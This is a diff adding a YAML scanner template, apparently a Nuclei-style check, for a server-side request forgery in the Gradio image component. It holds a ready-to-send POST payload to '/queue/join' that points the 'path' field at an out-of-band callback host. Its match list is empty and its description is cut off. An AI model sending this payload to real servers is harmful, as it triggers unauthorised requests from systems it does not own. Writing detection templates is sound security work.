@@ -1,0 +1,22 @@
+id: gradio-image-ssrf
+brief:
+    title: Gradio Image Component - Server-Side Request Forgery
+    by: ritikchaddha
+    level: high
+    about: A Server-Side Request Forgery (SSRF) vulnerability exists in the gradio-app/gradio image component allows an attacker to exploit SSRF using the path value in the `/queue/join` endpoint, obtained fr...
+    label:
+        - cve
+        - cve2024
+        - gradio
+        - ssrf
+        - oast
+        - vuln
+    score: CVSS:8.6
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/queue/join?'
+      head:
+        content-type: application/json
+      body: '{"data":[{"path":"http://{{interactsh-url}}"}],"fn_index":0,"session_hash":"123"}'
+      signs: []
